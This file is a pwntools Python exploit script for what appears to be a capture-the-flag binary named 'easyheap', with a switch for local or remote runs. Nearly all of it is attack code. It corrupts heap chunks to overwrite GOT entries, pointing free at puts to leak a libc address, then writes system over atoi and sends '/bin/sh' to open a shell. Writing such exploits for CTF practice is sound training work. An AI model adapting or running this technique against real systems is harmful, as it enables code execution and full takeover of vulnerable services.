#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'easyheap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'
#libFile = './libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla(':', str(1))
	sla('?', str(size))
	if(size <= 0x400):
		sa('?', data)

def rm(idx):
	sla(':', str(2))
	sla('?', str(idx))

def md(idx, data):
	sla(':', str(3))
	sla('?', str(idx))
	sa('?', data)

def dp(idx):
	sla(':', str(4))
	sla(':', str(idx))

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	# use head chunk attack to got table
	p = p64(exe.got['free']) + p64(0x10)
	p += p64(0x0) * 2
	p += p64(exe.got['atoi']) + p64(0x10)
	p += p64(0x0) * 2
	p += p64(exe.got['atoi']) + p64(0x10)

	ad(0x80,  p)
	rm(0) # free
	ad(0x401, 'C') #idx 0 for add head
	ad(0x401, 'C') #idx 1 for attack free got
	ad(0x401, 'C') #idx 2 for puts atoi addr and for call sys

	md(1, p64(exe.plt['puts'])[0:6])
	# leaking atoi addr in libc
	rm(2)
	atoi = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	lib.address = atoi - lib.sym['atoi']
	li('libc_base ' + hex(lib.address))

	ad(0x401, 'C') # for modify atoi addr
	# modify atoi got as system addr
	md(2, p64(lib.sym['system']))
	#get shell
	sl('/bin/sh')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
